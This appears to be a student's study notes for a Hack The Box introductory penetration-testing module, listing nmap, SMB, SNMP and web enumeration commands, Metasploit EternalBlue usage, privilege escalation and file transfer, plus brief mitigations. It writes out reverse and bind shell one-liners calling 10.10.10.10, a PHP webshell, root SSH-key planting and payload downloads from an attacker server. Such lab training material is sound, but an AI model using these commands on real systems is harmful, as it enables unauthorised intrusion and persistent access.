# Getting Started

## 🎯 Main Idea
- Foundational walkthrough of the full hacking workflow: enumeration → exploitation → privilege escalation → file transfer, using HTB.
- Teaches core tooling (Linux, tmux, vim, nmap, Metasploit, shells) and how to stay organized and connect via VPN.
- Culminates in an end-to-end worked example (the "Nibbles" box) from enumeration to root.

## 💥 Attack / Exploit Vectors
### Service Scanning & Enumeration
- Identify open ports, services, versions, and run NSE scripts to find footholds.
- **Commands**
  - `nmap 10.129.42.253` — Run nmap on an IP
  - `nmap -sV -sC -p- 10.129.42.253` — Script + version scan on all ports
  - `locate scripts/citrix` — List available nmap scripts
  - `nmap --script smb-os-discovery.nse -p445 10.10.10.40` — Run a specific NSE script
  - `netcat 10.10.10.10 22` — Grab banner of an open port
  - `smbclient -N -L \\\\10.129.42.253` — List SMB shares (null session)
  - `smbclient \\\\10.129.42.253\\users` — Connect to an SMB share
  - `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` — Scan SNMP
  - `onesixtyone -c dict.txt 10.129.42.254` — Brute force SNMP community string

### Web Enumeration
- Discover directories, subdomains, and web technologies/banners.
- **Commands**
  - `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` — Directory scan
  - `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` — Sub-domain scan
  - `curl -IL https://www.inlanefreight.com` — Grab website banner
  - `whatweb 10.10.10.121` — Webserver/certificate details
  - `curl 10.10.10.121/robots.txt` — List potential directories in robots.txt
  - `ctrl+U` — View page source in Firefox

### Public Exploits (searchsploit & Metasploit)
- Find and run known exploits for discovered software versions.
- **Commands**
  - `searchsploit openssh 7.2` — Search public exploits
  - `msfconsole` — Start the Metasploit Framework
  - `search exploit eternalblue` — Search exploits in MSF
  - `use exploit/windows/smb/ms17_010_psexec` — Select an MSF module
  - `show options` — Show required module options
  - `set RHOSTS 10.10.10.40` — Set a module option value
  - `check` — Test if target is vulnerable
  - `exploit` — Run the exploit

### Using Shells (reverse, bind, web)
- Gain interactive command execution on the target and upgrade the shell.
- **Commands**
  - `nc -lvnp 1234` — Start a nc listener locally
  - `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` — Send a reverse shell
  - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f` — Alternate reverse shell
  - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f` — Start a bind shell on target
  - `nc 10.10.10.1 1234` — Connect to a bind shell
  - `python -c 'import pty; pty.spawn("/bin/bash")'` — Upgrade TTY (1)
  - `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice — Upgrade TTY (2)
  - `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` — Create a PHP webshell
  - `curl http://SERVER_IP:PORT/shell.php?cmd=id` — Execute a command via webshell

### Privilege Escalation
- Enumerate the host for misconfigurations to escalate from user to root.
- **Commands**
  - `./linpeas.sh` — Enumerate the host for privesc vectors
  - `sudo -l` — List available sudo privileges
  - `sudo -u user /bin/echo Hello World!` — Run a command as another user with sudo
  - `sudo su -` — Switch to root
  - `sudo su user -` — Switch to another user
  - `ssh-keygen -f key` — Create a new SSH key
  - `echo "ssh-rsa AAAAB...M= user@parrot" >> /root/.ssh/authorized_keys` — Add public key to a user
  - `ssh root@10.10.10.10 -i key` — SSH in with the generated private key

### Transferring Files
- Move tools onto and loot off of the target.
- **Commands**
  - `python3 -m http.server 8000` — Start a local webserver
  - `wget http://10.10.14.1:8000/linpeas.sh` — Download file to target (wget)
  - `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` — Download file to target (curl)
  - `scp linenum.sh user@remotehost:/tmp/linenum.sh` — Transfer file via scp
  - `base64 shell -w 0` — Encode a file to base64
  - `echo f0VMR...InmDwU | base64 -d > shell` — Decode base64 back to file
  - `md5sum shell` — Verify the file transferred correctly

## 🛠️ Key Tools & Concepts
- Pentest distro — Kali/ParrotOS as the attack platform.
- tmux — terminal multiplexer for organized, persistent sessions.
- vim — in-terminal text editor (insert/normal modes, yank/paste, save/quit).
- VPN — `sudo openvpn user.ovpn` to connect to the HTB lab network.
- Basic networking — `ifconfig`/`ip a`, `netstat -rn`, `ssh`, `ftp`.
- Staying organized — note-taking and structured documentation during engagements.
- Common infosec terms — CIA triad, CVE/CVSS, shells, etc.
- Nibbles walkthrough — enumeration, web footprinting, initial foothold, privilege escalation, and alternate Metasploit method as a full worked example.

## 🛡️ Mitigations
- Patch known-vulnerable services/versions to defeat public exploits (e.g. EternalBlue/MS17-010).
- Disable anonymous/null sessions (SMB) and default SNMP community strings (public/private).
- Enforce least privilege and restrict sudo rules to avoid privilege escalation.
- Use strong, unique credentials to resist brute-force and credential reuse.
